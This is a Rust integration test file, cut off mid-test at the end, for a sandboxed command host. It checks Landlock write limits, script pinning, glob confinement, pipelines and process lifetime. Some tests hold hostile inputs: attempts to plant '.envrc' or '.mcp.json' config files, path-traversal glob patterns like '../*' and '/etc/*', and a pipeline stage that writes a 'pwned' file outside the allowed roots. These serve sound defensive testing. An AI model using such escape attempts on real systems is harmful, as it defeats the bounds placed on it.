fn hello_reports_the_landlock_abi_or_null() {
    let mut h = Host::start();
    let v = h.ok("hello", json!({}));
    let abi = &v["sandbox"]["landlockAbi"];
    assert!(abi.is_null() || abi.as_i64().is_some_and(|n| n > 0), "landlockAbi is a positive number or null: {v}");
    if cfg!(target_os = "linux") {
        if std::env::var("WMLHOST_REQUIRE_SANDBOX").as_deref() == Ok("1") {
            assert!(
                abi.as_i64().is_some_and(|n| n > 0),
                "CI requires Landlock, so landlockAbi must be a number (a dead ABI probe reports null): {v}"
            );
        } else {
            eprintln!("linux landlockAbi: {abi}");
        }
    }
    h.close();
}

// --- write: "roots" is NAME-IMMUTABLE at the top level of every root ---

/// Runs `script` under `write: "roots"` and returns the `done`.
fn roots_envelope(h: &mut Host, r: &Path, script: &str) -> Value {
    run_envelope(h, json!({ "argv": ["sh", "-c", script], "cwd": r }), json!({ "write": "roots", "exec": "any" })).1
}

#[test]
fn write_roots_starts_in_a_root_that_holds_files_and_symlinks() {
    let (_d, r) = root();
    std::fs::write(r.join("README.md"), "x").unwrap();
    std::fs::write(r.join(".mcp.json"), "{}").unwrap();
    std::fs::create_dir(r.join(".git")).unwrap();
    std::fs::write(r.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
    std::os::unix::fs::symlink(r.join("README.md"), r.join("link")).unwrap();
    std::os::unix::fs::symlink(r.join("nowhere"), r.join("stale")).unwrap();
    std::fs::create_dir(r.join("work")).unwrap();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        let d = roots_envelope(&mut h, &r, "true");
        assert_eq!(d["error"]["code"], "SandboxFailed", "without Landlock, write: roots is refused, not run wide: {d}");
        return h.close();
    }
    // A file child, a .git file child and two symlinks must not break the ruleset (a directory-only
    // right on a file is a hard Landlock error; a symlink is never granted).
    let d = roots_envelope(&mut h, &r, "echo x > work/out && echo y >> README.md");
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    assert!(r.join("work/out").exists());
    assert_eq!(
        std::fs::read_to_string(r.join("README.md")).unwrap(),
        "xy\n",
        "an existing top-level file stays editable"
    );
    h.close();
}

#[test]
fn write_roots_withholds_make_reg_so_envrc_and_mcp_json_cannot_appear() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    for name in [".envrc", ".mcp.json"] {
        let d = roots_envelope(&mut h, &r, &format!("echo x > {name}"));
        assert_ne!(d["code"], 0, "write: roots created {name}: {d}");
        assert!(!r.join(name).exists(), "{name} appeared");
    }
    h.close();
}

#[test]
fn write_roots_withholds_make_dir_so_envrc_cannot_appear_as_a_directory() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    for name in [".envrc", ".vscode", ".mcp.json"] {
        let d = roots_envelope(&mut h, &r, &format!("mkdir {name}"));
        assert_ne!(d["code"], 0, "write: roots made a top-level directory {name}: {d}");
        assert!(!r.join(name).exists(), "{name} appeared");
    }
    h.close();
}

#[test]
fn write_roots_withholds_make_sym_so_mcp_json_cannot_be_planted() {
    let (_d, r) = root();
    std::fs::create_dir(r.join("elsewhere")).unwrap();
    std::fs::write(r.join("elsewhere/x"), "x").unwrap();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    for name in [".mcp.json", ".envrc"] {
        let d = roots_envelope(&mut h, &r, &format!("ln -s elsewhere/x {name}"));
        assert_ne!(d["code"], 0, "write: roots planted a symlink at {name}: {d}");
        assert!(!r.join(name).exists(), "{name} appeared");
    }
    h.close();
}

#[test]
fn write_roots_withholds_remove_file_so_a_top_level_file_cannot_be_replaced() {
    let (_d, r) = root();
    std::fs::write(r.join("scratch"), "x").unwrap();
    std::fs::write(r.join(".mcp.json"), "{}").unwrap();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    // `scratch` is not one of the protected names bubblewrap re-binds, so this fails only because
    // RemoveFile is withheld from the root — re-grant it and the test goes red.
    let d = roots_envelope(&mut h, &r, "rm scratch");
    assert_ne!(d["code"], 0, "write: roots removed a top-level file: {d}");
    assert!(r.join("scratch").exists(), "scratch was removed");
    let d = roots_envelope(&mut h, &r, "rm .mcp.json");
    assert_ne!(d["code"], 0, "write: roots removed .mcp.json: {d}");
    assert!(r.join(".mcp.json").exists(), ".mcp.json was removed");
    h.close();
}

#[test]
fn write_roots_withholds_remove_dir_so_a_top_level_dir_cannot_be_dropped() {
    let (_d, r) = root();
    std::fs::create_dir(r.join("scratchdir")).unwrap();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    let d = roots_envelope(&mut h, &r, "rmdir scratchdir");
    assert_ne!(d["code"], 0, "write: roots dropped a top-level directory: {d}");
    assert!(r.join("scratchdir").exists(), "scratchdir was dropped");
    h.close();
}

#[test]
fn write_roots_withholds_refer_so_mcp_json_cannot_be_moved_in() {
    let (_d, r) = root();
    std::fs::create_dir(r.join("elsewhere")).unwrap();
    std::fs::write(r.join("elsewhere/x"), "x").unwrap();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    if cfg!(target_os = "linux") && landlock_abi(&mut h).is_none() {
        return h.close();
    }
    // A cross-directory rename needs REFER on both directories; the root has none, so a new name
    // cannot be moved in (and `elsewhere` cannot hand one out of the top level either).
    let d = roots_envelope(&mut h, &r, "mv elsewhere/x .mcp.json");
    assert_ne!(d["code"], 0, "write: roots moved a file in as .mcp.json: {d}");
    assert!(!r.join(".mcp.json").exists(), ".mcp.json appeared");
    h.close();
}

#[test]
fn an_envelope_on_an_unsandboxed_call_is_refused_not_misreported() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    let facts = h.ok("spawn", json!({ "argv": ["touch", "inside"], "cwd": r }));
    assert_eq!(facts["sandboxed"], false);
    let id = facts["id"].as_str().unwrap().to_string();
    // An unsandboxed call holds no bound. A narrower-than-today envelope must be refused, never run
    // wide while done claims it was applied.
    let e = h.call("start", json!({ "id": id, "envelope": { "write": "roots", "exec": "any" } })).unwrap_err();
    assert_eq!(e.0, "SandboxFailed", "{e:?}");
    assert!(!r.join("inside").exists(), "the refused call never ran");
    // Without an envelope the call runs, and done reports the floor as "today" (unknown to the
    // extension, never a claim that a bound was held).
    let (facts, d) = h.run(json!({ "argv": ["touch", "inside"], "cwd": r }));
    assert_eq!(facts["sandboxed"], false);
    assert_eq!(d["code"], 0, "{d}");
    assert_eq!(
        d["envelope"],
        json!({ "write": "today", "exec": "any" }),
        "done never says \"roots\" for an absent one"
    );
    h.close();
}

#[test]
fn exec_unders_failure_is_spoken_in_the_shape_sandbox_failed_listens_for() {
    // The shape pairing behind the end-to-end report: `wmlhost exec-under` exits 2 with its name
    // first on stderr when it cannot fully enforce the ruleset, and session.rs reads exactly that as
    // SandboxFailed (unit-tested there). This pins the speaking side.
    let out = Command::new(env!("CARGO_BIN_EXE_wmlhost"))
        .args(["exec-under", r#"{"abi":99,"exec":[],"writeEdit":[],"writeFiles":[],"writeTrees":[]}"#, "--", "true"])
        .output()
        .expect("wmlhost exec-under runs");
    assert_eq!(out.status.code(), Some(2), "a ruleset it cannot enforce exits 2: {out:?}");
    assert!(
        out.stderr.starts_with(b"wmlhost exec-under:"),
        "the stderr head is the one sandbox_refusal matches: {:?}",
        String::from_utf8_lossy(&out.stderr)
    );
}

// --- the program's fingerprint ---

#[test]
fn a_programs_fingerprint_is_stable_and_changes_when_the_file_does() {
    let (_d, r) = root();
    let prog = r.join("ls");
    std::fs::copy("/bin/ls", &prog).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let fp = |h: &mut Host| {
        let f = h.ok("spawn", json!({ "argv": ["./ls"], "cwd": r }));
        h.ok("discard", json!({ "id": f["id"] }));
        f["program"]["fingerprint"].as_str().expect("a fingerprint string").to_string()
    };
    let first = fp(&mut h);
    assert_eq!(first.split(':').count(), 4, "{first}");
    assert_eq!(fp(&mut h), first, "the same file, the same fingerprint");
    // same size, other modification time
    let f = std::fs::OpenOptions::new().write(true).open(&prog).unwrap();
    f.set_modified(std::time::SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000)).unwrap();
    let touched = fp(&mut h);
    assert_ne!(touched, first);
    // rewritten
    std::fs::OpenOptions::new().append(true).open(&prog).unwrap().write_all(b"\0").unwrap();
    let appended = fp(&mut h);
    assert_ne!(appended, touched);
    assert_ne!(appended, first);
    // a program outside the root has one too
    let f = h.ok("spawn", json!({ "argv": ["sh", "-c", "true"], "cwd": r }));
    assert!(f["program"]["fingerprint"].is_string(), "{f}");
    h.close();
}

// --- pins: an interpreted script's entrypoint, hashed (PROGRAM_MANIFEST.md, "Interpreted script tools") ---

fn sha256_hex(b: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    hex::encode(Sha256::digest(b))
}

#[test]
fn a_hashed_argument_names_the_given_and_resolved_file_and_hashes_the_one_after_symlinks() {
    let (_d, r) = root();
    std::fs::create_dir(r.join("scripts")).unwrap();
    let body = b"touch ran\n";
    std::fs::write(r.join("scripts/real.sh"), body).unwrap();
    std::os::unix::fs::symlink("real.sh", r.join("scripts/link.sh")).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let fact = |h: &mut Host, cwd: &Path, given: &str| {
        let f = h.ok("spawn", json!({ "argv": ["sh", given], "cwd": cwd, "pathArgs": [{ "arg": 1, "hash": true }] }));
        h.ok("discard", json!({ "id": f["id"] }));
        f["paths"][0].clone()
    };
    let p = fact(&mut h, &r, "scripts/link.sh");
    assert_eq!(p["given"], "scripts/link.sh");
    assert_eq!(p["path"], json!(r.join("scripts/real.sh")), "the file after symlinks: {p}");
    assert_eq!(p["sha256"], json!(sha256_hex(body)));
    // a relative entrypoint resolves against the call's cwd
    let q = fact(&mut h, &r.join("scripts"), "link.sh");
    assert_eq!((&q["path"], &q["sha256"]), (&p["path"], &p["sha256"]), "{q}");
    // without `hash` there is no hash; a directory or a file past the cap has none to match
    let f = h.ok("spawn", json!({ "argv": ["sh", "scripts/real.sh"], "cwd": r, "pathArgs": [{ "arg": 1 }] }));
    assert!(f["paths"][0].get("sha256").is_none(), "{f}");
    assert_eq!(fact(&mut h, &r, "scripts")["sha256"], Value::Null);
    std::fs::File::create(r.join("big")).unwrap().set_len((16 << 20) + 1).unwrap();
    assert_eq!(fact(&mut h, &r, "big")["sha256"], Value::Null);
    let bad = h.call("spawn", json!({ "argv": ["sh", "x"], "cwd": r, "pathArgs": [{ "arg": 1, "hash": "yes" }] }));
    assert_eq!(bad.unwrap_err().0, "BadRequest");
    h.close();
}

#[test]
fn an_unchanged_pinned_script_runs() {
    let (_d, r) = root();
    std::fs::write(r.join("tool.sh"), "touch ran\n").unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": ["sh", "tool.sh"], "cwd": r, "pathArgs": [{ "arg": 1, "hash": true }] }));
    assert_eq!(d["ok"], true, "{d}");
    assert!(r.join("ran").exists());
    h.close();
}

#[test]
fn a_script_changed_between_its_facts_and_start_is_refused_and_never_runs() {
    let (_d, r) = root();
    std::fs::write(r.join("tool.sh"), "touch ran\n").unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let pinned = json!({ "argv": ["sh", "tool.sh"], "cwd": r, "pathArgs": [{ "arg": 1, "hash": true }] });
    let f = h.ok("spawn", pinned.clone());
    std::fs::write(r.join("tool.sh"), "touch ran; touch evil\n").unwrap();
    assert_eq!(h.call("start", json!({ "id": f["id"] })).unwrap_err().0, "PinChanged");
    assert_eq!(h.call("start", json!({ "id": f["id"] })).unwrap_err().0, "UnknownId", "the refused call is gone");
    // a pipeline with a changed stage starts none of its stages' work
    let f = h.ok("spawn", pinned);
    let tail = h.ok("spawn", json!({ "argv": ["cat"], "cwd": r }));
    std::fs::write(r.join("tool.sh"), "touch ran\n").unwrap();
    assert_eq!(h.call("pipe", json!({ "ids": [f["id"], tail["id"]] })).unwrap_err().0, "PinChanged");
    std::thread::sleep(Duration::from_millis(300));
    assert!(!r.join("ran").exists() && !r.join("evil").exists());
    h.close();
}

// --- glob: expansion within the roots ---

fn glob(h: &mut Host, cwd: &Path, pattern: &str) -> Value {
    h.ok("glob", json!({ "cwd": cwd, "pattern": pattern }))
}

fn names(v: &Value) -> Vec<&str> {
    v["matches"].as_array().expect("matches").iter().map(|m| m.as_str().unwrap()).collect()
}

fn write_tree(r: &Path, files: &[&str]) {
    for f in files {
        let p = r.join(f);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, "").unwrap();
    }
}

#[test]
fn glob_expands_inside_a_root_sorted_relative_to_cwd() {
    let (_d, r) = root();
    write_tree(&r, &["src/b.rs", "src/a.rs", "src/x/c.rs", "src/x/d.txt", "top.rs"]);
    let mut h = Host::start();
    assert_eq!(h.call("glob", json!({ "cwd": r, "pattern": "*" })).unwrap_err().0, "NotConfigured");
    h.ok("configure", json!({ "roots": [r] }));
    let v = glob(&mut h, &r, "src/**/*.rs");
    assert_eq!(names(&v), ["src/a.rs", "src/b.rs", "src/x/c.rs"]);
    assert_eq!(v["truncated"], false);
    assert_eq!(names(&glob(&mut h, &r, "src/*")), ["src/a.rs", "src/b.rs", "src/x"], "directories match too");
    assert_eq!(names(&glob(&mut h, &r, "src/[ab].rs")), ["src/a.rs", "src/b.rs"]);
    assert_eq!(names(&glob(&mut h, &r, "src/[!a].rs")), ["src/b.rs"]);
    assert_eq!(names(&glob(&mut h, &r, "nothing/**")), Vec::<&str>::new());
    // relative to the cwd given, not to the root
    assert_eq!(names(&glob(&mut h, &r.join("src"), "x/*")), ["x/c.rs", "x/d.txt"]);
    h.close();
}

#[test]
fn glob_never_enters_a_symlink_that_leaves_the_root() {
    let (_d, r) = root();
    let (_o, outside) = root();
    write_tree(&outside, &["leak.txt", "deep/leak2.txt"]);
    write_tree(&r, &["real/ok.txt"]);
    std::os::unix::fs::symlink(&outside, r.join("link")).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let v = glob(&mut h, &r, "**/*");
    assert_eq!(names(&v), ["link", "real", "real/ok.txt"], "the link may match by name, nothing beneath it");
    assert_eq!(names(&glob(&mut h, &r, "link/*")), Vec::<&str>::new());
    assert_eq!(names(&glob(&mut h, &r, "link/**/*.txt")), Vec::<&str>::new());
    // a cwd that is the link resolves outside the root and is refused
    let e = h.call("glob", json!({ "cwd": r.join("link"), "pattern": "*" })).unwrap_err();
    assert_eq!(e.0, "CwdOutsideRoots");
    h.close();
}

#[test]
fn glob_refuses_what_could_leave_the_directory() {
    let (_d, r) = root();
    let (_o, outside) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    for bad in ["../*", "a/../../b", "/etc/*", "./a", "a/./b", "a//b", "a/", "", "a\0b", &"x".repeat(4097)] {
        let e = h.call("glob", json!({ "cwd": r, "pattern": bad })).unwrap_err();
        assert_eq!(e.0, "BadRequest", "{bad:?}");
    }
    for bad in [json!({ "cwd": r }), json!({ "cwd": r, "pattern": 7 }), json!({ "pattern": "*" })] {
        assert_eq!(h.call("glob", bad).unwrap_err().0, "BadRequest");
    }
    assert_eq!(h.call("glob", json!({ "cwd": "relative", "pattern": "*" })).unwrap_err().0, "BadRequest");
    for cwd in [outside.clone(), PathBuf::from("/"), r.join("missing"), r.join("..")] {
        let e = h.call("glob", json!({ "cwd": cwd, "pattern": "*" })).unwrap_err();
        assert_eq!(e.0, "CwdOutsideRoots", "{}", cwd.display());
    }
    h.close();
}

#[test]
fn glob_truncates_at_the_limit_and_clamps_it() {
    let (_d, r) = root();
    for i in 0..30 {
        std::fs::write(r.join(format!("f{i:02}")), "").unwrap();
    }
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let v = h.ok("glob", json!({ "cwd": r, "pattern": "f*", "limit": 10 }));
    assert_eq!((v["matches"].as_array().unwrap().len(), &v["truncated"]), (10, &json!(true)));
    let v = h.ok("glob", json!({ "cwd": r, "pattern": "f*", "limit": 30 }));
    assert_eq!((v["matches"].as_array().unwrap().len(), &v["truncated"]), (30, &json!(false)));
    let v = h.ok("glob", json!({ "cwd": r, "pattern": "f*", "limit": 0 }));
    assert_eq!(v["matches"].as_array().unwrap().len(), 1, "the minimum is 1");
    assert_eq!(v["truncated"], true);
    let v = h.ok("glob", json!({ "cwd": r, "pattern": "f*", "limit": 10_000_000_000u64 }));
    assert_eq!(v["matches"].as_array().unwrap().len(), 30, "a huge limit is clamped, not refused");
    h.close();
}

#[test]
fn glob_stops_at_the_entry_cap() {
    let (_d, r) = root();
    for i in 0..20_050 {
        std::fs::write(r.join(format!("f{i}")), "").unwrap();
    }
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let v = h.ok("glob", json!({ "cwd": r, "pattern": "nomatch*", "limit": 100_000 }));
    assert_eq!(v["truncated"], true, "past 20000 directory entries");
    h.close();
}

#[test]
fn glob_skips_git_and_keeps_hidden_names_for_patterns_that_ask() {
    let (_d, r) = root();
    write_tree(&r, &[".git/config", "sub/.git/config", ".env", ".hidden/x", "visible", "sub/.rc", "sub/vis"]);
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(names(&glob(&mut h, &r, "*")), ["sub", "visible"], "dotfiles are not in *");
    assert_eq!(names(&glob(&mut h, &r, ".*")), [".env", ".hidden"], "but .* has them, and not .git");
    assert_eq!(names(&glob(&mut h, &r, "**/*")), ["sub", "sub/vis", "visible"]);
    assert_eq!(names(&glob(&mut h, &r, "**/.*")), [".env", ".hidden", "sub/.rc"]);
    assert_eq!(names(&glob(&mut h, &r, ".git/*")), Vec::<&str>::new());
    assert_eq!(names(&glob(&mut h, &r, "sub/.git")), Vec::<&str>::new());
    h.close();
}

// --- pipe: stages joined by OS pipes ---

/// Spawns each argv in `cwd` and returns the facts' ids.
fn spawn_all(h: &mut Host, cwd: &Path, stages: &[&[&str]]) -> Vec<String> {
    stages
        .iter()
        .map(|argv| {
            h.ok("spawn", json!({ "argv": argv, "cwd": cwd, "timeoutMs": 20_000 }))["id"].as_str().unwrap().into()
        })
        .collect()
}

#[test]
fn a_pipeline_joins_its_stages_and_holds_only_the_last_stdout() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let ids = spawn_all(&mut h, &r, &[&["sh", "-c", "printf 'b\\na\\nb\\n'"], &["sort"], &["uniq"]]);
    let v = h.ok("pipe", json!({ "ids": ids }));
    assert_eq!(v["ids"], json!(ids));
    let pids = v["pids"].as_array().unwrap();
    assert_eq!(pids.len(), 3);
    assert!(pids.iter().all(|p| p.as_u64().unwrap() > 0));
    assert!(h.events.is_empty(), "the answer came before any done");
    let dones: Vec<Value> = ids.iter().map(|id| h.done(id)).collect();
    for (i, d) in dones.iter().enumerate() {
        assert_eq!(d["code"], 0, "stage {i}: {d}");
        assert_eq!(d["ok"], true);
        assert!(d["stderr"]["ptr"].is_string(), "every stage's stderr is held: {d}");
        if i < 2 {
            assert_eq!(d["stdout"], json!({ "piped": true }), "stage {i}");
        }
    }
    assert_eq!(text(&h.read_all(&dones[2]["stdout"])), "a\nb\n");
    // started once: the ids are consumed
    assert_eq!(h.call("start", json!({ "id": ids[0] })).unwrap_err().0, "UnknownId");
    h.close();
}

#[test]
fn a_reader_that_exits_early_ends_the_pipeline() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let ids = spawn_all(&mut h, &r, &[&["yes"], &["head", "-n1"]]);
    h.ok("pipe", json!({ "ids": ids }));
    let last = h.done(&ids[1]);
    assert_eq!(last["code"], 0, "{last}");
    assert_eq!(text(&h.read_all(&last["stdout"])), "y\n");
    let first = h.done(&ids[0]);
    assert_eq!(first["timedOut"], false, "the producer died of the closed pipe, not of its time limit: {first}");
    assert_eq!(first["cancelled"], false);
    assert_ne!(first["ok"], true, "{first}");
    assert!(first["durationMs"].as_u64().unwrap() < 15_000, "{first}");
    h.close();
}

#[test]
fn cancelling_one_stage_leaves_the_others_to_end_on_their_own() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let ids = spawn_all(&mut h, &r, &[&["sleep", "30"], &["cat"]]);
    h.ok("pipe", json!({ "ids": ids }));
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(h.ok("cancel", json!({ "id": ids[0] })), json!({ "signalled": true }));
    let first = h.done(&ids[0]);
    assert_eq!(first["cancelled"], true);
    let last = h.done(&ids[1]);
    assert_eq!((&last["cancelled"], &last["code"]), (&json!(false), &json!(0)), "cat saw end of input: {last}");
    h.close();
}

#[test]
fn a_bad_id_starts_nothing_and_consumes_nothing() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let ids = spawn_all(&mut h, &r, &[&["touch", "marker"], &["cat"]]);
    let e = h.call("pipe", json!({ "ids": [ids[0], "c999", ids[1]] })).unwrap_err();
    assert_eq!(e.0, "UnknownId");
    assert!(e.1.contains("c999"), "names the first bad id: {}", e.1);
    std::thread::sleep(Duration::from_millis(300));
    assert!(!r.join("marker").exists(), "nothing started");
    // an id used twice, too few, too many, the wrong shape
    for bad in [json!([ids[0], ids[0]]), json!([ids[0]]), json!([]), json!("c1,c2"), json!([1, 2]), json!(null)] {
        assert_eq!(h.call("pipe", json!({ "ids": bad })).unwrap_err().0, "BadRequest", "{bad}");
    }
    let many: Vec<String> = (0..17).map(|i| format!("c{i}")).collect();
    assert_eq!(h.call("pipe", json!({ "ids": many })).unwrap_err().0, "BadRequest");
    assert_eq!(h.call("pipe", json!({})).unwrap_err().0, "BadRequest");
    // both ids are still pending and run alone
    h.ok("start", json!({ "id": ids[0] }));
    assert_eq!(h.done(&ids[0])["code"], 0);
    assert!(r.join("marker").exists());
    h.ok("start", json!({ "id": ids[1] }));
    h.done(&ids[1]);
    // a discarded id is no longer pending either
    let again = spawn_all(&mut h, &r, &[&["true"], &["true"]]);
    h.ok("discard", json!({ "id": again[1] }));
    assert_eq!(h.call("pipe", json!({ "ids": again })).unwrap_err().0, "UnknownId");
    h.close();
}

#[test]
fn a_stage_that_fails_to_start_ends_the_ones_before_it() {
    let (_d, r) = root();
    let gone = r.join("gone");
    std::fs::copy("/bin/cat", &gone).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    let ids = spawn_all(&mut h, &r, &[&["sh", "-c", "sleep 2; touch late"], &["./gone"]]);
    std::fs::remove_file(&gone).unwrap();
    let e = h.call("pipe", json!({ "ids": ids })).unwrap_err();
    assert_eq!(e.0, "SpawnFailed", "{e:?}");
    std::thread::sleep(Duration::from_millis(2500));
    assert!(!r.join("late").exists(), "the first stage was killed");
    h.ok("hello", json!({}));
    assert!(h.events.is_empty(), "no done events for a pipe that did not start: {:?}", h.events);
    // and the ids are gone
    assert_eq!(h.call("start", json!({ "id": ids[0] })).unwrap_err().0, "UnknownId");
    h.close();
}

#[test]
fn a_sandboxed_pipeline_still_cannot_write_outside_the_roots() {
    let (_d, r) = root();
    let (_o, outside) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    let c = h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(c["sandboxed"], true);
    let evil = format!("cat >/dev/null; touch '{}'", outside.join("pwned").display());
    let ids = spawn_all(&mut h, &r, &[&["echo", "hi"], &["sh", "-c", &evil], &["sh", "-c", "cat; touch inside"]]);
    h.ok("pipe", json!({ "ids": ids }));
    let dones: Vec<Value> = ids.iter().map(|id| h.done(id)).collect();
    assert_ne!(dones[1]["code"], 0, "{}", dones[1]);
    assert!(!outside.join("pwned").exists(), "a write outside the roots got through a pipeline");
    assert_eq!(dones[2]["code"], 0, "{}", text(&h.read_all(&dones[2]["stderr"])));
    assert!(r.join("inside").exists(), "writes inside the roots still work");
    h.close();
}

// --- owners: every call has one, and dies with it by default ---

/// Waits up to `ms` for `p` to exist.
fn appears(p: &Path, ms: u64) -> bool {
    let end = std::time::Instant::now() + Duration::from_millis(ms);
    while std::time::Instant::now() < end {
        if p.exists() {
            return true;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    p.exists()
}

/// A call that writes `started` at once and `late` after `secs`, unless it is killed first.
fn marker_call(h: &mut Host, r: &Path, secs: u32, extra: Value) -> String {
    let mut args = json!({ "argv": ["sh", "-c", format!("touch started; sleep {secs}; touch late")], "cwd": r });
    args.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
    let f = h.ok("spawn", args);
    let id = f["id"].as_str().unwrap().to_string();
    h.ok("start", json!({ "id": id }));
    assert!(appears(&r.join("started"), 5000));
    id
}

#[test]
fn the_owner_is_echoed_in_the_facts_and_listed_while_the_call_runs() {
    let (_d, r) = root();
    let mut h = Host::start();
    let c = h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(c["onOwnerLoss"], json!({ "policy": "kill" }), "{c}");
    let owner = json!({ "session": "s1", "run": "r1", "step": 3 });
    let f = h.ok("spawn", json!({ "argv": ["sleep", "30"], "cwd": r, "owner": owner }));
    assert_eq!(f["owner"], owner);
    let id = f["id"].as_str().unwrap().to_string();
    h.ok("start", json!({ "id": id }));
    let st = h.ok("status", json!({}));
    let row = st["running"].as_array().unwrap().iter().find(|c| c["id"] == json!(id)).cloned().expect("listed");
    assert_eq!(row["owner"], owner);
    assert_eq!(row["onOwnerLoss"]["policy"], "kill");
    h.ok("cancel", json!({ "id": id }));
    h.done(&id);
    assert_eq!(h.ok("status", json!({}))["running"], json!([]));
    h.close();
}

#[test]
fn an_owner_that_is_not_a_small_object_is_refused() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    for bad in [json!("r1"), json!({ "run": "x".repeat(2000) })] {
        let e = h.call("spawn", json!({ "argv": ["true"], "cwd": r, "owner": bad })).unwrap_err();
        assert_eq!(e.0, "BadRequest");
    }
    let e = h.call("spawn", json!({ "argv": ["true"], "cwd": r, "onOwnerLoss": "detach" })).unwrap_err();
    assert_eq!(e.0, "BadRequest");
    h.close();
}

#[test]
fn a_sleeper_dies_with_its_port() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    marker_call(&mut h, &r, 2, json!({}));
    h.close();
    std::thread::sleep(Duration::from_millis(3000));
    assert!(!r.join("late").exists(), "the call outlived its port");
}

#[test]
fn a_host_killed_outright_still_takes_its_calls_with_it() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    marker_call(&mut h, &r, 2, json!({}));
    // What Jetsam or the OOM killer does: no EOF, no cleanup; the host's warden is all that is left.
    h.child.kill().unwrap();
    h.child.wait().unwrap();
    std::thread::sleep(Duration::from_millis(3000));
    assert!(!r.join("late").exists(), "the call outlived its killed host");
}

#[test]
fn an_orphan_outlives_its_port_is_listed_with_its_owner_and_dies_at_its_deadline() {
    let (_d, r) = root();
    let state = tempfile::tempdir().unwrap();
    let dir = state.path().join("owners");
    let mut h = Host::start_in(&dir, &[]);
    h.ok("configure", json!({ "roots": [r] }));
    let owner = json!({ "run": "r9" });
    marker_call(&mut h, &r, 1, json!({ "owner": owner, "onOwnerLoss": "orphan", "orphanTimeoutMs": 60_000 }));
    // A second call under the default policy dies with the port.
    let r2 = r.join("k");
    std::fs::create_dir(&r2).unwrap();
    marker_call(&mut h, &r2, 1, json!({}));
    h.close();

    let mut next = Host::start_in(&dir, &[]);
    let st = next.ok("status", json!({}));
    let orphans = st["orphans"].as_array().unwrap();
    assert_eq!(orphans.len(), 1, "{st}");
    assert_eq!(orphans[0]["owner"], owner);
    assert!(orphans[0]["deadlineMs"].as_u64().is_some());
    assert!(appears(&r.join("late"), 5000), "the orphan was killed before its deadline");
    std::thread::sleep(Duration::from_millis(1500));
    assert!(!r2.join("late").exists(), "the default policy kills");
    next.close();

    // A short deadline: the warden kills it once it passes.
    let mut h = Host::start_in(&dir, &[]);
    h.ok("configure", json!({ "roots": [r] }));
    std::fs::remove_file(r.join("late")).unwrap();
    marker_call(&mut h, &r, 3, json!({ "onOwnerLoss": "orphan", "orphanTimeoutMs": 500 }));
    h.close();
    std::thread::sleep(Duration::from_millis(4000));
    assert!(!r.join("late").exists(), "the orphan outlived its deadline");
}

// --- the memory bound: physical footprint, enforced by the host ---

/// Allocates and touches 16 MiB every 20 ms until `total` MiB, then sleeps a little and exits 0.
fn allocator(total_mib: u32) -> Vec<String> {
    let py = format!(
        "import time\na=[]\nfor _ in range({}):\n    a.append(bytearray(b'x'*(16<<20)))\n    time.sleep(0.02)\ntime.sleep(0.3)",
        total_mib / 16
    );
    vec!["python3".into(), "-c".into(), py]
}

#[test]
fn a_call_past_its_memory_bound_is_killed_and_done_says_so() {
    let (_d, r) = root();
    let mut h = Host::start();
